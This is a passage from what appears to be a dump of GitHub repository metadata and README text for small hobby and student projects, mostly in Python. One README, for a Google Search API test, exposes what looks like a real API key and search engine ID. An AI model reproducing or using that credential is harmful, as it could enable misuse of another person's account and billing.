turn light on and turn it off with single fn+Space press Payload description Device vendor = 048d, product = c963 HEADER ........... cc HEADER ........... 16 EFFECT ........... 01 - static / 03 - breath / 04 - wave / 06 - hue SPEED ............ 01 / 02 / 03 / 04 BRIGHTNESS ....... 01 / 02 RED SECTION 1 .... 00-ff GREEN SECTION 1 .. 00-ff BLUE SECTION 1 ... 00-ff RED SECTION 2 .... 00-ff GREEN SECTION 2 .. 00-ff BLUE SECTION 2 ... 00-ff RED SECTION 3 .... 00-ff GREEN SECTION 3 .. 00-ff BLUE SECTION 3 ... 00-ff RED SECTION 4 .... 00-ff GREEN SECTION 4 .. 00-ff BLUE SECTION 4 ... 00-ff UNUSED ........... 00 WAVE MODE RTL .... 00 / 01 WAVE MODE LTR .... 00 / 01 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00 UNUSED ........... 00  "
417656423;SentenceEmbeddingAPI;https://github.com/mjash93/SentenceEmbeddingAPI;;2021-10-15T22:45:24Z;0;0;0;
417652479;geoIntersectBench;https://github.com/jonpecar/geoIntersectBench;Python;2021-10-15T22:22:29Z;0;0;0;
417609715;Choose-your-own-adventure;https://github.com/Colosimorichard/Choose-your-own-adventure;Python;2021-10-15T19:14:18Z;0;0;0;
417576887;Inkbird_IBS-TH2_Scanner;https://github.com/rockstar2020/Inkbird_IBS-TH2_Scanner;Python;2021-10-15T17:05:37Z;0;0;0;Inkbird_IBS-TH2_Scanner A simple python code to read tempreature and humidity from Inkbird IBS-TH2 sensor and publish the result in a JSON format to a MQTT Server. I have tested this code using Python 3.7 only. All you need to do is to add your Inkbird MAC address and MQTT details. You can run this code as part of your crontab jobs (ie every 3min) 
417619558;gdpassfinder;https://github.com/qaiik/gdpassfinder;Python;2021-10-15T19:57:14Z;0;0;0;
417651355;FromsPrimeNumberTester;https://github.com/FromageSauvage/FromsPrimeNumberTester;Python;2021-10-15T22:16:54Z;0;0;0;FromsPrimeNumberTester Code cru en python pour tester les nombres premiers et plus. Python 3.7 Je précise que ce code est dans le domaine public mais il a été crée par moi. Cet example est un code cru en python pour tester des nombre premiers et lister leurs diviseurs si ils en ont. 
417656248;quiz-dev-pro;https://github.com/GregMasterBr/quiz-dev-pro;Python;2021-10-15T22:44:33Z;0;0;0;Python PRO - Jornada Rumo a Primeira Vaga - Sistema QUIZ DEV Pro - Renzo - Ed - Março 2021 - https://www.youtube.com/c/PythonProBr mkdir pasta python -m venv/venv venv\Scripts\Activate.ps1 pip install django django-admin startproject quiz . #verificar se instalou python manage.py runserver #criando um app /[dir]> python manage.py startapp base no settings.py adicionar o app que foi instalado. python manage.py makemigrations (aplicar nossas models no banco) python manage.py migrate python manage.py createsuperuser 
417657072;Practica-Con-Pytest-Mock;https://github.com/Luigi-Avila/Practica-Con-Pytest-Mock;Python;2021-10-15T22:49:25Z;0;0;0;
417606863;TestAutoRepo;https://github.com/MarcusGenFus/TestAutoRepo;Python;2021-10-15T19:02:55Z;0;0;0;This is a Test Repo to test python with automated pushes and pulls to github 
417636902;writetext.py;https://github.com/cookiezombie/writetext.py;Python;2021-10-15T21:09:51Z;0;0;0;
417582269;hooks-vb;https://github.com/violet-black/hooks-vb;;2021-10-15T17:26:29Z;0;0;0;
417645283;photofetch;https://github.com/thejevans/photofetch;;2021-10-15T21:48:03Z;0;0;0;photofetch A fetch app that shows important photography times. written in python 
417647056;spy-collage;https://github.com/stephanlensky/spy-collage;Python;2021-10-15T21:57:36Z;0;0;0;
417666413;PySQL;https://github.com/xmlns/PySQL;Python;2021-10-15T23:45:04Z;0;0;0;PySQL Experimenting with Python 🐍, PyODBC 🔌, and SQL Alchemy 🧪 to execute queries on multiple SQL Servers Story Do you refresh your QA databases often? Do you have to manually run SQL transactions on all your QA environments to regain admin privileges as a dev? Not too long ago I decided I did not want to keep doing this every time we had a DB refresh. 
417653399;Temperature_converter;https://github.com/Qames19/Temperature_converter;Python;2021-10-15T22:27:25Z;0;0;0;Temperature Converter  This is a quick python application that queries the user to convert from Celsius to Fahrenheit or vice versa. Once the user has selected the type of conversion required, the program queries the user for a temperature input, and then converts the temperature to the desired unit and displays the result with a precision of two decimal places.  The program repeats until the user chooses not to.  
417581658;UV_and_PL;https://github.com/Beandope/UV_and_PL;Python;2021-10-15T17:24:06Z;0;0;0;UV_and_PL This repository contains python codes for analyzing UV and PL spectra, both involving Franck-Condon Analysis. In the UV code, it plots the UV absorption spectra and simulate the low-energy part which is believed to attribute to the aggregates of P3HT. The ratio of extinction coefficients of aggregate and non-aggregate phase could be calculated from the differences of the spectra when the temperature changes. Thus, the percent of aggregates in the solid-state P3HT films could be calculated by integrating FC analysis and extinction coefficients. 
417560422;Selenium-WebDriver;https://github.com/subhendudash02/Selenium-WebDriver;Python;2021-10-15T16:06:21Z;0;0;0;
417643038;IBSNtools;https://github.com/vsjoen/IBSNtools;Python;2021-10-15T21:36:08Z;0;0;0;"IBSNtools  Description IBSNtools is a set of tools for analyzing image ballistics in social networks written in Python. These tools can be used to organize and compare images uploaded to various social networks to the original image files. The view tool will display whether or not the image data has been modified after being uploaded to a social network. IBSNview analyzes whether or not the images have been re-named, re-sized or re-compressed. It also analyzes whether or not EXIF data has been stripped or modified. Quantization tables and EXIF data for the images can be viewed, and the data can also be exported to CSV format for further analysis. Prerequisites This program requires Python 3.x as well as the following libraries:  opencv_contrib_python piexif numpy Pillow  Installation Run pip from the main folder to install requirements. pip install -r requirements.txt  Known issues  Clicking next image too fast on Linux may cause the program to freeze. Some of the EXIF data is encoded in byte format and therefore not human-readable.  How to use After installing prerequisites and organizing your image files, run IBSNview.py to start the program. Folder structure In order for the GUI-tool to work, the images have to adhere to a certain folder structure. There should be one parent folder that contains sub-folders named after the cameras used to take the photos. In the camera folders, there should be one folder for each original photo taken by the camera. Inside the image folder, there should be exactly one image file (the original photo), as well as one sub-folder for each social network you have uploaded the original image to. Inside the social network folders there should be exactly one image that was uploaded and downloaded from the respective social network platform.  imageFolder ├── CANON_650D_720X480_INDOOR │   ├── IMG_2635 │   │   ├── IMG_2635.JPG │   │   ├── facebook │   │   │   └── 1.jpg │   │   ├── flickr │   │   │   └── 26204266014_76ce7dd748_b.jpg │   │   ├── google+ │   │   │   └── IMG_2635.jpg │   │   ├── imgur │   │   │   └── 01\ -\ 3POgMpm.jpg │   │   ├── instagram │   │   │   └── 12818938_1140129992698752_861157192_n.jpg │   │   ├── telegram │   │   │   └── 422116736_16288720980252527992.jpg │   │   ├── tinypic │   │   │   └── 34fgw8i.jpg │   │   ├── tumblr │   │   │   └── tumblr_o3q9e2zuH21vnf44lo1_1280.jpg │   │   ├── twitter │   │   │   └── Cdp0SEgWwAAJQd8.jpg │   │   └── whatsapp │   │       └── IMG-20160314-WA0011.jpg │   └── IMG_2636 │       ├── IMG_2636.JPG │       ├── facebook │       │   └── 2.jpg │       ├── flickr │       │   └── 26204266044_51bbb1f152_b.jpg │       ├── google+ │       │   └── IMG_2636.jpg │       ├── imgur │       │   └── 02\ -\ i7JYrol.jpg │       ├── instagram │       │   └── 12783835_452031228326433_1890673980_n.jpg │       ├── telegram │       │   └── 421222168_1084613614143026389.jpg │       ├── tinypic │       │   └── 262ky84.jpg │       ├── tumblr │       │   └── tumblr_o3q9e2zuH21vnf44lo2_1280.jpg │       ├── twitter │       │   └── Cdp0SH4XIAEVkBC.jpg │       └── whatsapp │           └── IMG-20160314-WA0010.jpg ├── SAMSUNG_NOTE3_NEO_3264X2448_INDOOR │   └── 20150213_134949 │       ├── 20150213_134949.jpg │       ├── facebook │       │   └── 4.jpg │       ├── flickr │       │   └── 26785067056_1e92ac59e0_h.jpg │       ├── google+ │       │   └── 20150213_134949.jpg │       ├── imgur │       │   └── 04\ -\ hrijZwh.jpg │       ├── instagram │       │   └── 10616644_224825451205119_1162687156_n.jpg │       ├── telegram │       │   └── 421211778_7609660349885752490.jpg │       ├── tinypic │       │   └── etw8kj.jpg │       ├── tumblr │       │   └── tumblr_o3qaitLYaa1vnf44lo8_1280.jpg │       ├── twitter │       │   └── CdqHTrwWAAA0IUm.jpg │       └── whatsapp │           └── 8.jpg └── SONY_POWERSHOT_A2300_4608X3456_OUTDOOR_NATURAL     └── IMG_9058         ├── IMG_9058.JPG         ├── facebook         │   └── 1.jpg         ├── flickr         │   └── 26741407941_760737c219_h.jpg         ├── google+         │   └── IMG_9058.jpg         ├── imgur         │   └── 01\ -\ WgE4eVV.jpg         ├── instagram         │   └── 1169337_1580090438985059_1840711599_n.jpg         ├── telegram         │   └── 421932970_1868051944404017215.jpg         ├── tinypic         │   └── 30kznsy.jpg         ├── tumblr         │   └── tumblr_o415wcLUAA1vnf44lo10_1280.jpg         ├── twitter         │   └── Cdp-mPDWAAAcRli.jpg         └── whatsapp             └── 5.jpg  Automatically Sort Images You can use the IBSNsort.py script to automatically sort your downloaded image files. In a parent folder, create one folder called ""unsorted"" and one folder called ""sorted"". Ensure that your original image files follow the folder structure of camera folder -> image folder -> image, then move the camera folders you want to use into the ""sorted"" folder. In the ""unsorted"" folder, create one folder for each social network you have downloaded images from, then place all the photos from each social network in their respective folders. Now you should be able to run the IBSNsort.py script to automatically sort the images. python3 IBSNsort.py sortFolder  Before sorting: sortFolder ├── sorted │   ├── CANON_650D_720X480_INDOOR │   │   └── IMG_2636 │   │       ├── IMG_2636.JPG │   ├── SAMSUNG_NOTE3_NEO_3264X2448_INDOOR │   │   └── 20150213_134949 │   │       ├── 20150213_134949.jpg │   └── SONY_POWERSHOT_A2300_4608X3456_OUTDOOR_NATURAL │       └── IMG_9058 │           ├── IMG_9058.JPG └── unsorted     └── facebook         ├── 1.jpg         ├── 2.jpg         └── 4.jpg  After sorting: sortFolder ├── sorted │   ├── CANON_650D_720X480_INDOOR │   │   └── IMG_2636 │   │       ├── IMG_2636.JPG │   │       └── facebook │   │           └── 2.jpg │   ├── SAMSUNG_NOTE3_NEO_3264X2448_INDOOR │   │   └── 20150213_134949 │   │       ├── 20150213_134949.jpg │   │       └── facebook │   │           └── 4.jpg │   └── SONY_POWERSHOT_A2300_4608X3456_OUTDOOR_NATURAL │       └── IMG_9058 │           ├── IMG_9058.JPG │           └── facebook │               └── 1.jpg └── unsorted     └── facebook         ├── 1.jpg         ├── 2.jpg         └── 4.jpg  Viewing Image Data After your images are sorted, you can run IBSNview.py to browse through the images and their data. python3 IBSNview.py  Exporting Image Data After your images are sorted and everything looks good in IBSNview, you can run IBSNexport.py to export the data to a CSV file.  python3 IBSNexport.py imageFolder fileName.csv  imageFolder is the folder containing your sorted images, and fileName.csv is the name of the output file. "
417616055;Google_Search_API;https://github.com/real-4w/Google_Search_API;Python;2021-10-15T19:41:36Z;0;0;0;Google_Search_API Willem's test to use the Google Search API in Python. See https://linuxhint.com/google_search_api_python/ for tips. 189d8811d7571443d AIzaSyDjJQqT8xLvxZFse2zUbf7R6JnVhv2JOkc 
417599365;EconometricsTutorials;https://github.com/kedoink/EconometricsTutorials;Jupyter Notebook;2021-10-15T18:32:02Z;0;0;0;"EconometricsTutorials Notebooks showing how to do econometrics work from Stata in python (BEE3015) Hi, my name is Josh, one of your classmates, I thought it might be useful for those interested to see how the Stata work being done in our Econometric Analysis tutorials can be performed in python. Please feel free to have a look through, comment and learn together :) You can reach me at jc956 ""at"" exeter . ac . uk "
417608504;Boto3_AWS_Scripts;https://github.com/karthik-Chandr/Boto3_AWS_Scripts;Python;2021-10-15T19:09:08Z;0;0;0;
417593527;Superstore-RFM-Segmentation-Analysis;https://github.com/andrewbruening/Superstore-RFM-Segmentation-Analysis;Jupyter Notebook;2021-10-15T18:09:28Z;0;0;0;"Hey! I'm Andrew. Welcome to my Github 👋 I'm a data analyst with a keen eye for design and user experience.  📊 Data visualization is my forte. See my Tableau page! 🚀 Most of what you see here is Tableau, Python, and Figma 🧠 I'm interested in how our social climate and media trends influence marketing needs ⛳ A nice quote: ""If it's worth doing, it's worth doing well""  "
417602367;Portfolio;https://github.com/rahimakhan3173/Portfolio;HTML;2021-10-15T18:44:23Z;0;0;0;Portfolio This is a Portfolio site that is built on flask framework of python 
417668139;anime-quote-wrapper;https://github.com/cpiccirilli1/anime-quote-wrapper;Python;2021-10-15T23:55:26Z;0;0;0;anime-quote-wrapper This is a python script for the api calls to https://animechan.vercel.app Please visit the website for more information about the api. See the examples file for usage. 
417582755;sales_and_report_automation;https://github.com/RichardFord10/sales_and_report_automation;Python;2021-10-15T17:28:21Z;0;0;0;
417597407;AdminBackEnd;https://github.com/ccitalan1/AdminBackEnd;;2021-10-15T18:24:46Z;0;0;0;AdminBackEnd Back End code that is connected to admin: Python, php etc.. 
417568313;pyKobuki;https://github.com/LostXine/pyKobuki;Python;2021-10-15T16:34:15Z;0;0;0;
417570817;Pycee-2.0;https://github.com/AriaAbrishamdar/Pycee-2.0;Python;2021-10-15T16:43:52Z;0;0;0;Pycee-2.0 Pycee 2.0: Enhanced Python Compiler Error Messages via Stack Overflow 
417618609;Stationary-management-system;https://github.com/mhamza-ali/Stationary-management-system;Jupyter Notebook;2021-10-15T19:53:02Z;0;0;0;Stationary-management-system 
417652840;Experiment;https://github.com/vrednyj/Experiment;Python;2021-10-15T22:24:25Z;0;0;0;
417585199;CV-Project-Air-Canvas;https://github.com/karandoshi1810/CV-Project-Air-Canvas;Python;2021-10-15T17:37:34Z;0;0;0;CV-Project-Air-Canvas This folder contains codes to create an air canvas using openCV and Python. 
417584011;100DaysofCode;https://github.com/sagar-n-deshpande/100DaysofCode;Python;2021-10-15T17:33:02Z;0;0;0;100DaysofCode This is repository where I will be sharing my learning Journey of Python 
417644839;Programacion_logica;https://github.com/DavidAvila502/Programacion_logica;Python;2021-10-15T21:45:44Z;0;0;0;
417607184;Buildings-of-Dimitrovgrad;https://github.com/antydemidov/Buildings-of-Dimitrovgrad;Jupyter Notebook;2021-10-15T19:04:12Z;0;0;0;Buildings of Dimitrovgrad (EN) What is this? This project was created to collect data of all buildings located in Dimitrovgrad, Ulianovsk region, Russia. Some words for search The table of keys    Key Value     Country Russia   Region Ulyanovsk Oblast   ISO 3166-1 RU   ISO 3166-2 RU-ULY   Code ОКАТО 73405   Code ОКТМО 73705000001   Name Dimitrovgrad    What I use?  Open Data of alta.ru: alta.ru Open Data of Reforma GKH: reformagkh.ru Open Street Map: openstreetmap.org 2GIS API: dev.2gis.ru Datata API: dadata.ru  Дома Димитровграда (RU) Что это такое? Этот проект создан для того, чтобы собрать данные по всем домам города Димитровграда, Ульяновская область, Россия. Несколько слов для поиска Таблица ключей    Ключ Значение     Страна Россия   Область Ульяновская область   Код страны по ISO 3166-1 RU   Код региона по ISO 3166-2 RU-ULY   Код ОКАТО 73405   Код ОКТМО 73705000001   Название Димитровград    Что я использую?  Общедоступные данные с сайта alta.ru: alta.ru Открытые данные с сайта Реформы ЖКХ: reformagkh.ru Open Street Map: openstreetmap.org 2GIS API: dev.2gis.ru Datata API: dadata.ru  
417641436;my-study-plan-tracker;https://github.com/prog-grid/my-study-plan-tracker;;2021-10-15T21:28:24Z;0;0;0;my-study-plan-tracker I created this program on python to help me track my study hours and help me reach my goals for various subjects. You can use for your self and customize it to your needs It's still in its early phases with no attractive UI, BUT it gets the job done. 
417653821;HorseRace;https://github.com/cordeirossauro/HorseRace;Python;2021-10-15T22:29:45Z;0;0;0;"Horse Race Simple game written in python that simulates a horse race and allows the player to bet on a horse.  Instructions Just download the ZIP file, extract it and run HorseRace.py from the terminal with $ python3 HorseRace.py  From there, just follow the instructions on screen and you will be good to go! If there are any missing libraries (very unlikely, since the game only uses a couple), you can install them with: $ pip3 install -r requirements.txt  Game Principle Everytime a new race starts, the game creates 10 horses and randomly generates two attributes for each one:  Speed (Between 2 and 12): The amount of spaces a horse can move in a single time step; Energy (Between 0 and 10): The amount of moves a horse can make before it gets tired.  After that, all horses go to the starting line and the race happens following the loop:  All horses move according to their speed; All horses lose 1 point of energy; If a horse becomes tired (Energy = 0), it loses half of its speed for the rest of the race;  Steps 1, 2 and 3 are repeated until one of the horses reaches the finish line. Details Created by: Vinicius Cordeiro "
417665481;top-down-multiplayer-shooter;https://github.com/akapkotel/top-down-multiplayer-shooter;Python;2021-10-15T23:39:23Z;0;0;0;
417629967;Analise_PIB;https://github.com/Alicemarpe/Analise_PIB;;2021-10-15T20:43:11Z;0;0;0;Analise_PIB Análise de dados usando a base de dados do IBGE , pib 2010 a 2019, usando somente Python 
417635709;ETH_GASBOT;https://github.com/markehhs/ETH_GASBOT;Python;2021-10-15T21:04:58Z;0;0;0;"ETH_GASBOT Discord bot written in python to display current gas values and estimated wait times for Ethereum transactions. Values are pulled from the ethgasstation API. Example !gas Slow: 102.0 gewi expected in: 16.5 minutes. Fast: 146.0 gwei expected in: 0.4 minutes. Fastest: 150.0 gwei expected in: 0.4 minutes. Average: 111.0 gwei expected in: 1.7 minutes. Installation and execution   Create a .env file in the same directory as gas.py and fill in with your values. You'll need the Discord bot token and the API key for ethgasstation.   DISCORD_TOKEN=YOUR_TOKEN_HERE ETH_GAS_KEY=YOUR_KEY_HERE   Run gas.py (may need to install dependencies based on your setup)   In Discord type ""!gas"" and the bot will display the current gas prices.   That's it. "
417612500;Weather-app;https://github.com/sparsh459/Weather-app;Python;2021-10-15T19:26:08Z;0;0;0;
417597256;twitter;https://github.com/suwilanji-chipofya/twitter;Python;2021-10-15T18:24:12Z;0;0;0;twitter Twitter clone using python django, html,css and javascript.This is the source code of #100DaysOfCode twitter challenge Note: I have only made the sidebar home page and search bar I will post an update of more pages  this is a 100 day project so I feel like taking my time 
417648805;image-segmentation-validation;https://github.com/ThomasCy/image-segmentation-validation;Python;2021-10-15T22:05:00Z;0;0;0;Segmentation-validator Python program which we create an autoencoder to learn the features of 3D segmentations to distinguish between good and bad segmentations.  
417580104;pyv4l2framesink;https://github.com/aniongithub/pyv4l2framesink;C++;2021-10-15T17:18:00Z;0;0;0;pyv4l2framesink A Python + native library to write frames to a V4L2 sink device, such as a loopback camera created with v4l2loopback 
417586688;DL_Mnist;https://github.com/nevesisaac/DL_Mnist;Jupyter Notebook;2021-10-15T17:43:15Z;0;0;0;DL_Mnist Código em python de uma aplicação de deep learnig para reconhecer valores numéricos do banco de dados mnist. 
417576641;PasswordManager;https://github.com/Sufyaan323/PasswordManager;;2021-10-15T17:04:44Z;0;0;0;PasswordManager A Python project which uses SQLite to create and store usernames and passwords, as well as the website name.  Research Needed:  How does a password manager works? How does hashing work? Is there any extensions I need to use to allow Python to interact with the SQLlite database?   Research Results:  There are 3 main types of password managers:  Offline - The passwords are stored locally Online - The passwords are stored on a remote server Token-based / Stateless - A physical hardware, such as a USB, which contains a key to unlock a user's account    I will be creating an offline password manager which will first hash and maybe even salt passwords before inputting them into the SQL database i will create with SQLite, a serverless database.  Researching Have not started researching  
417619143;Pharmacy-management-system;https://github.com/mhamza-ali/Pharmacy-management-system;Jupyter Notebook;2021-10-15T19:55:29Z;0;0;0;Pharmacy-management-system 2nd semester uni project of OOP coded with python with GUI implementation to demonstrate the concepts of object oriented programming 
417590163;MagdaAndAntoineAndTheVan;https://github.com/afauroux/MagdaAndAntoineAndTheVan;;2021-10-15T17:56:46Z;0;0;0;
417654600;TokenFarmContract;https://github.com/pshenprojects/TokenFarmContract;TypeScript;2021-10-15T22:34:09Z;0;0;0;TokenFarmContract Following the final tutorial at https://www.youtube.com/watch?v=M576WGiDBdQ Smart contracts written in Solidity to be deployed on a compatible blockchain. This 'Token Farm' holds compatible tokens from users, and can pay out in its own token based on the price in USD of the users' holdings, determined through Chainlink's price feeds. The contract deployments are handled with Brownie and written in Python, while the front-end interface is done with React programming in Typescript. If downloading and running this code yourself, make sure to install the node module dependencies. Although the video tutorial was used as reference, no code was actually copied from their provided repositories. The brownie-config.yaml file is very barebones, as this work was only tested on a Ganache chain. Deploying to a blockchain that exists beyond your local machine, either to a test network such as Kovan or Rinkeby, or a more real blockchain with real money (or money-equivalent) involved, will require some additional code to handle and reference existing token and price feed contracts. The front end website works with the MetaMask browser extension, which is required to interact with it. 
417593258;google-assistance;https://github.com/rahimakhan3173/google-assistance;;2021-10-15T18:08:31Z;0;0;0;google-assistance mini search engine through which you can search items and solve simple mathematical problems.python , wolframalpha, wikipedia are used in this projects Required libraries: 1- wolframaplha ---> pip install wolframalpha 2- Wikipedia    ---> pip install wikipedia 3- tkinter      ---> pip install tk 4- pygame       ---> pip install pygame 5- gtts         ---> pip install gTTS 
417639209;ODE-analyzer;https://github.com/JJThi0/ODE-analyzer;Python;2021-10-15T21:18:54Z;0;0;0;ODE-analyzer A series of Python classes that can be used to analyse (systems of) first order and seconder order ordinary differential equations. This was orignally written as a practical for my university course. It has since grown into a small library that I use for analyzing (systems of) ODEs. Particularly useful for the Schroedinger equation. 
417595113;Tiktok2Youtube-shorts;https://github.com/Karim-Arab/Tiktok2Youtube-shorts;JavaScript;2021-10-15T18:15:34Z;0;0;0;Tiktok2Youtube-shorts simple script to download tiktok clips without watermark, used node js+ puppeteer requirements: Node Js + Puppeteer How to use: node tiktok in terminal or command prompt. result will be saved in names.txt and videos in same location. Remember to change Keyword (love) to keyword u want depend on content for 12 video at once. all videos will be saved no watermark unless tiktok user upload his clips with logo now u can bulk upload to your youtube channel with just click make sure to not take a copyright music or videos! Cheers 
417618514;kiosk-http-automation-server;https://github.com/lululombard/kiosk-http-automation-server;Python;2021-10-15T19:52:40Z;0;0;0;"kiosk-http-automation-server Small Python app to start/stop services that I use with Home Assistant to start/stop kiosk/camera services and display. It was written in ~30 minutes so it's far from perfect but it works. ⚠️ There is no authentication at all, so don't run this on a public network! Example Service curl http://localhost:5000/services/vlc.service/status -> {""running"":false,""success"":true} curl -X POST http://localhost:5000/services/vlc.service/start -> {""success"":true} curl http://localhost:5000/services/vlc.service/status -> {""running"":true,""success"":true} curl -X POST http://localhost:5000/services/vlc.service/stop -> {""success"":true} Display curl http://10.1.0.39:5000/display/status -> {""on"":true,""success"":true} curl -X POST http://10.1.0.39:5000/display/off -> {""success"":true} curl http://10.1.0.39:5000/display/status -> {""on"":false,""success"":true} curl -X POST http://10.1.0.39:5000/display/on -> {""success"":true} Setup You'll need Python 3.8 (or later) for this. Tested on Ubuntu 20.04 LTS. sudo apt install build-essential libpython3-dev libdbus-1-dev libdbus-glib-1-dev python3 -m venv env source env/bin/activate pip install -r requirements.txt How to run You can just run server.py as root, like sudo env/bin/python server.py. The way I host it on my Kiosk computer is with the systemd file provided, and I use it to start a custom VLC service to display my CCTV camera when a motion is detected via Home Assistant using a command line switch and curl. "
417609338;cryptopi;https://github.com/rnaniqw2/cryptopi;Python;2021-10-15T19:12:37Z;1;1;0;cryptopi This is a Python API for 2FA and Cryptography. It's mostly cryptography using the Polyalphabetic Cipher, but you can convert it to 2FA. Go to Info.txt for detailed step-by-step instructions. 
417586065;elm-android-app;https://github.com/leforestier/elm-android-app;Python;2021-10-15T17:40:47Z;0;0;0;" Requirements  You need to have installed:  the Android SDK Elm Python git     Starting a project Simply clone this repo and then cd into it.  Build script The script that enables you to build and/or install the app onto the device is manage.py. It's a single Python script without any dependencies. You can call it like this on the command line: $ python manage.py (see next section for commands available)  On Linux you should be able to do simply: $ ./manage.py (see next section for commands available)   To build an Elm application (running in a webview)  Keystore First, and this is something  you only have to do once per project, create a debug Android keystore using the command: $ ./manage.py create-debug-key  This create a keystore in the current directory under the file name debug.keystore.  Environment variables You need to supply three environment variables to the script: - BUILD_TOOLS_DIR: the directory of the Android SDK where reside tools such as `aapt` and `dx`.   For example, I use `BUILD_TOOLS_DIR=/home/myusername/Android/Sdk/build-tools/29.0.0/`  - PLATFORM_DIR: the directory of the Android SDK where reside `android.jar`.   For example I use `PLATFORM_DIR=/home/myusername/Android/Sdk/platforms/android-29/`  - KEYSTORE_FILE: the keystore file. If you created it by `manage.py create-debug-keystore`,   then the file is `debug.keystore` and you should use `KEYSTORE_FILE=debug.keystore`  The rest of this tutorial assume you have exported these 3 environment variables using: $ export BUILD_TOOLS_DIR=... PLATFORM_DIR=... KEYSTORE_FILE=...   Build the apk Build an apk with the command: $ ./manage.py build  The apk is created inside the build directory.  Install the app on an Android device Make sure your device is connected to your computer in debug mode (you can use the command adb devices to check if your device appear in the list). Then: $ ./manage.py install  You can also install the app and start it automatically using: $ ./manage.py install+run   Changing the name of the application You change the name of the application exactly like you would in a normal Java only android application. The name displayed in the icon list of the device is the name you find in the AndroidManifest.xml in the android:label attribute of the application tag. We've used ""Elm App"" as an example. You can change the package name from the original example we've used (com.example.elmwebviewapp) to what you like (say net.birdwatchers.birdspot) by renaming the directories java/com/example/elmwebviewapp to java/net/birdwatchers/birdspot, then replace the first line package com.example.elmwebviewapp; in MainActivity.java with package net.birdwatchers.birdspot;. Then replace the package=""com.example.elmwebviewapp"" manifest attribute in AndroidManifest.xml with package=""net.birdwatchers.birdspot""  Changing the icon of the application Same as with a normal Java only android application. Refer to Android development documentation.  Viewing the app in the browser using elm-live Before loading the app on the device, you can develop using elm-live and see your changes in the browser of your laptop/desktop. This requires to have installed elm-live. Then: $ ./manage.py elm-live  This is just a shortcut for: $ elm-live src/Main.elm -d assets -- --output=assets/main.js  "
417565811;Cat_And_Dog_Image_Classifier;https://github.com/JonWeber0328/Cat_And_Dog_Image_Classifier;Jupyter Notebook;2021-10-15T16:25:07Z;0;0;0;"Cat And Dog Image Classifier This repository uses Python and the TensorFlow framework to create a convolutional neural network model that can classify images of dogs and cats. The project was completed as part of the freeCodeCamp Machine Learning with Python Certification. Getting Started  These instructions will get you a copy of the project up and running on your local machine for developement and testing purposes. See Deployment for notes on how to deploy the project on a live system. Prerequisites  What things you need to install the software and how to install them.  Google Account  Installing  A step by step series of examples that tell you how to get a development environment running. Setting up a Google account is very easy. You can follow the steps below or click the link to Google Account Help below to get started. Google Account Help   Go to the Google account Sign In page.   Click Create account.   Enter your name.   In the ""Username"" field, enter a username.   Enter and confirm your password.   Click Next. Optional: Add and verify a phone number for your account.   Click Next.   Deployment  Open Google Colab   Click on the Copy_of_fcc_cat_dog.ipynb file in this repository.   Click on ""Open in Colab"" as shown in the following image.    Click on ""Save a copy in Drive"" under the File dropdown.  You should now have your own copy on your Google My Drive.   Acknowledgments   I'd like to thank Dominic LaBella, my instructor at the Data Visualization and Analytics Boot Camp I attended, for planting a seed in my brain that was the start of my computer programming knowledge and understanding. I work hard every day to grow that seed. None of this would be possible for me if not for his passion for teaching and deep understanding of these subjects.  Project Visuals            "
417647337;SANTITIZER_FOR_FIRST_AND_LAST_NAMES;https://github.com/Samuel-Muldoon/SANTITIZER_FOR_FIRST_AND_LAST_NAMES;;2021-10-15T21:59:00Z;0;0;0;"SANTITIZER FOR FIRST AND_LAST_NAMES So.... I was filing paperwork on the computer for an apartment. Their website would not allow me to apply to the apartment without typing my name perfectly, with the first letter of each word capitalized samuel muldoon..... ERROR SAMUEL MULDOON .... ERROR Samuel Muldoon ..... made their website happy. This is not the first time I have used a website which did this. Below is code I wrote in python which makes sure that the first letter of each word is a capital (uppercase) letter and that all other letters are lowercase. Bascially, it doesn't matter how people type things, because it takes 10 lines of code or less for the computer to fix it. Here you go: def fix_case_on_name(xname: str) -> str:     """"""     This function correctly capitalizes people's names.     Some examples are shown below:          +------------+-----------+     |  INPUT     |  OUTPUT   |     +------------+-----------+     +------------+-----------+     | IaN MilLeR | IanMiller |     +------------+-----------+     | Ian Miller | IanMiller |     +------------+-----------+     | IAN MILLER | IanMiller |     +------------+-----------+          """"""     # Impementation      iname = str(xname).strip()     xparts = iname.split()     oparts = [None]*len(xparts)     for idx, xpart in enumerate(xparts, 0):         opart = xpart[0].upper() + xpart[1:].lower()         oparts[idx] = opart     oname = "" "".join(oparts)     return oname  "
417561381;Snapchat_Snaps;https://github.com/Shashank-electronics/Snapchat_Snaps;Python;2021-10-15T16:09:38Z;0;0;0;Snapchat_Snaps This is a circuit-python code suitable for raspberry pi pico will send multiple snaps in snapchat application with the help of HID library, no human interaction needed 
417632700;SimplexPy;https://github.com/ron4fun/SimplexPy;Python;2021-10-15T20:53:17Z;0;0;0;"SimplexPy SimplexPy is a compact python library that automatically solves Linear Programming Equations i.e Maximization problems, easily and quickly while giving you neat results. To run unittest check in the test folder. Example """""" Solve using the Simplex method the following problem: Maximize 	Z = f(x,y) = 3x + 2y subject to: 	2x + y ≤ 18                 2x + 3y ≤ 42                 3x + y ≤ 24                 x ≥ 0 , y ≥ 0 """""" def main(): 	     # problem setup     problem = [         ['w1',2,1,1,0,0,18],         ['w2',2,3,0,1,0,42], 	['w3',3,1,0,0,1,24],         ['P',-3,-2,0,0,0,0]     ]      result = SimplexPy.SolveEq(problem, 2) # where 2 is the total number of variables      """"""     {'w4': Fraction(0, 1), 'w3': Fraction(3, 1), 'w2': Fraction(0, 1),      'w1': Fraction(0, 1), 'x2': Fraction(12, 1), 'x1': Fraction(3, 1),     'Pmax': Fraction(33, 1)}     """""" License Copyright (c) 2021 Mbadiwe Nnaemeka Ronald ron2tele@gmail.com  This software is provided 'as-is', without any express or implied warranty. In no event will the author be held liable for any damages arising from the use of this software. Permission is granted to anyone to use this software for any purpose, including commercial applications, and to alter it and redistribute it freely, subject to the following restrictions:  1. The origin of this software must not be misrepresented; you must not claim that you wrote the original software. If you use this software in a product, an acknowledgment in the product documentation must be specified.  2. Altered source versions must be plainly marked as such, and must not be misrepresented as being the original software.  3. This notice may not be removed or altered from any source distribution.  "
